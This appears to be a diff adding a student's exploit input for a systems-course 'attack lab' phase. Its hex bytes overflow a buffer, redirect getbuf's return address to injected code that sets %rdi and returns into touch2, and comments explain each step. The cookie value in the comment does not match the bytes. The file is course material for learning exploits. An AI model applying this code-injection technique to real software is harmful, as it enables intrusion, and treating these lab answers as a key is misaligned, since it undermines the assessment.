@@ -1,0 +1,25 @@
+00 00 00 00 00 00 00 00 /* overflow buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+48 9d 67 55 00 00 00 00 /* replace getbuf retaddr with the mov instructions */
+
+48 c7 c7 8e a5 36 5b 90 /* replace rdi values */
+
+68 1e 17 40 00 90 90 90 /* push touch2 address to stack so that it returns to this address */
+c3 00 00 00 00 00 00 00 /* and then replace rdi values */
+
+
+
+/* We need */
+/* instruction to go to new code segment */
+/* instruction to replace rdi values */
+/* instruction to go to touch2 */
+
+/* bf 48 2c 40 00  ... mov $0x402c48,%edi */
+/* 48 c7 c7 8e a5 3b 5b ... mov $5b3ba58e, %rdi */
+/* 0x0000000055679d48 address of mov instrution?
+
+/* Touch 2 000000000040171e */
+/* You don't actually have to push the address, you're actually just supposed to return it after I think */
